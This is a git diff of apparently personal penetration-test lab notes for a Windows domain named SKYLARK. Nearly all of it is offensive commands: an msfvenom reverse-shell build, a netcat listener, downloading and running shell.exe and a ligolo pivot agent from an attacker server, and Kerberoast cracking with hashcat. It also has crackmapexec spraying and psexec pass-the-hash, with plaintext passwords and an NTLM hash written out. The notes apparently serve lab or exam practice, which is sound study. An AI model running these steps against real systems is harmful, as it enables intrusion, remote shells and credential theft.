@@ -71,8 +71,8 @@ xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221
 
 # get a better shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe -o shell.exe
-nc -nvlp 9999
-iwr -uri http://192.168.45.217:8000/shell.exe -Outfile shell.exe
+nc -nvlp 8888
+iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
 .\shell.exe
 
 ```
@@ -149,7 +149,7 @@ iwr -uri http://192.168.45.217:8000/nc.exe -Outfile nc.exe
 sudo hashcat -m 13100 backup.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
-.221 pivot
+.221 pivot -> .10 -> pivot to .111, .110
 ```
 # from kali
 sudo ip tuntap add user kali mode tun ligolo
@@ -166,7 +166,17 @@ sudo ip route add 10.10.76.0/24 dev ligolo
 iwr -uri http://192.168.45.217:8000/agent.exe -Outfile agent.exe
 ./agent.exe -ignore-cert -connect 192.168.45.217:11601
 
-sudo nmap -p- -Pn 10.10.76.111 -sS -T 5 --verbose
+# 22,5901
+sudo nmap -p- -Pn 10.10.76.10 -sS -T 5 --verbose
+vncviewer 10.10.76.10::5901
+# need password from 220
+
+sudo nmap -p- -Pn 10.10.76.11 -sS -T 5 --verbose
+crackmapexec smb 10.10.76.11 -u backup_service -p pIt4Server --continue-on-success --local-auth
+crackmapexec winrm 10.10.76.11 -u backup_service -p pIt4Server --continue-on-success --local-auth
+impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.11 
+sudo nmap -p- -Pn 10.10.76.12 -sS -T 5 --verbose
+sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
 ```
 
 .222
